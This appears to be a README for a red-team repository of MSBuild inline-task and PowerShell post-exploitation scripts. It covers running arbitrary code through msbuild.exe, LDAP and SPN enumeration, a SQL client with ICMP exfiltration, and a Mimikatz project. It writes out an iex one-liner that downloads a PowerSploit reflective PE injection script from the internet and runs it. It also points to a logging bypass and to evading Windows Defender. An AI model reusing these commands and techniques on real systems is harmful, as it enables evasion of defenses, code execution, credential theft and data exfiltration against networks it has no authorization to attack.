


## MSBUILD.EXE POST EXPLOITATION SCRIPTS ##

Msbuild.exe can be used to execute arbitrary commands and .net code through various methods.  Loading and executing .csproj files that use inline tasks in one of those methods.  This repository contains a few csharp programs that use that method to execute common red team tasks such as executing arbitrary PowerShell, LDAP, and SQL Server commands/queries.

Other methods not covered include:
* Project File Parsing And Import Injection
* PropertyGroup Expansion and Injection
* Command Line injection to influence build process
* Dynamic Properties
* Items and targets
* Reference: http://subt0x11.blogspot.com/2018/11/microsoft-build-engine-compromise-part_13.html
* Reference: https://gist.github.com/caseysmithrc/047a32203ad7c2f92eb250a0bbd01cac
* Reference: https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild?view=vs-2015#BKMK_Targets

### Command Execution Options ###
Simply navigate to the folder containing the .csproj file and run the msbuild.exe command from its path as shown below.  You can explicitly define the .csproj file to load, but it is not required if only one .csproj file exists the your current working directory.  <Br><Br>
`C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe `
<Br>
`C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.csproj`
 <Br>
 `C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.csproj /p:AllowUnsafeBlocks=true`
<Br>  
  In some cases you may have to set the environmental variable below to execute constrained .net API calls.
  <Br><Br> 
 `set MSBUILDENABLEALLPROPERTYFUNCTIONS=1`
<Br>
`$env:MSBUILDENABLEALLPROPERTYFUNCTIONS = 1`

### CSharp Project Files and Descriptions ###

|Project File|Description |
|:--------------------------------|:-----------|
|msbuild_ldap_sqlinstances.csproj|Execute a LDAP query and obtain a list of SQL Server SPNs/Instance.|
|msbuild_ldap_userspns.csproj|This should return all SPNs for the users in the domain. | 
|msbuild_ldap_users.csproj|This should return all users in the domain.|
|msbuild_powershell_console.csproj|The .net code will provide a powershell console if all the libs are available. Make sure you have the correct System.Management.Automation.dll referenced for the target system. <br><br> Note 1: If PowerShell transcription or script block logging is enabled, the PowerShell commands you run will still show up in the logs regardless if they are run through powershell.exe or through the msbuild .net program using System.Management.Automation.dll.  However, that could potentially be disabled with this https://cobbr.io/ScriptBlock-Logging-Bypass.html. <br><br> Note 2: If outbound HTTP filter rules are not restrictive and WindowsDefender isnt running, you can launch other applicaiton with the snippet below through the powershell console.<br><br> `iex(new-object net.webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1");$PEBytes = [IO.File]::ReadAllBytes('c:\windows\system32\calc.exe');Invoke-ReflectivePEInjection -PEBytes $PEBytes`|
|msbuild_powershell_execfile.csproj|The .net code will run powershell code stored in c:\windows\temp\test.txt, however you can change the path. Make sure you have the correct System.Management.Automation.dll referenced for the target system.|
|msbuild_powershell_exec_sb.csproj|The .net code will run powershell scriptblock stored in the "readtext" variable, which you can change to meet your needs. Make sure you have the correct System.Management.Automation.dll referenced for the target system.|
|msbuild_powershell_exec_iex.csproj|The .net code will run powershell scriptblock and the sample shows how to download and execute a script from the internet using invoke-expression, which you can change to meet your needs.  The sample downloaded from the internet will write a text file to c:\temp\test123.txt. Make sure you have the correct System.Management.Automation.dll referenced for the target system.|
|msbuild_sql_query.csproj|This is a simple C# SQL Server client console that can be run through msbuild.<br>1. Connection strings are hard coded by default using the "connString" variable.  You can change the connection string on the fly with the "setconn" command.<br>2. Query results are written to c:\windows\temp\file.csv by default. You can change the output file using the "setfile" command.<br>3. ICMP exfilatation is disabled by default. By setting the "enableicmp" variable to true, and <br>setting the IP, the results of each query will be sent to the provided IP in the payloads of ICMP echo requests.<br>The payloads are encrypted by default using a hard coded salt/key.  You can use the baked in decryption function to decrypt the payload data on the receiving system. You can also disable encrypted payloads by setting the "enableEncryption" variable to "false", but cleartext data == bad idea.<br>	4. Type "help" for basic instructions.<br> Todo: <br> Fix sql data types <br> Display autosize
|msbuild_template.csproj|This is a basic .csproj template that uses inline tasks from .net code execution|
|msbuild_template_datatable.csproj |This is a basic .csproj template that uses inline tasks from .net code execution and uses datatables for storage and displaying results|
|msbuild_mimikatz.csproj|This one was written by Casey Smith.|

## POWERSHELL POST EXPLOITATION SCRIPTS ##

### Get-Spn.ps1 ###
* This should return all SPNs for the users and computers in the domain.

### Get-SQLQuery.psm1 ###
* This script can be used as an adhoc PowerShell based sql server client.  It should work in powershell v2.  Consider removing the examples before deployed though.

This script can be used to query Active directory for a list of SQL Server SPNs as the domain user logged into a domain system.  They are intended to be used during red team engagement and should have a smaller detectable footprint than PowerUpSQL.

### Get-SpnSql1.ps1 ###
* This does not use any code from PowerUpSQL and is pretty lite wieght.

### Get-SpnSql2.ps1 ###
* This uses 3 functions from PowerUpSQL, but all comments have been removed.
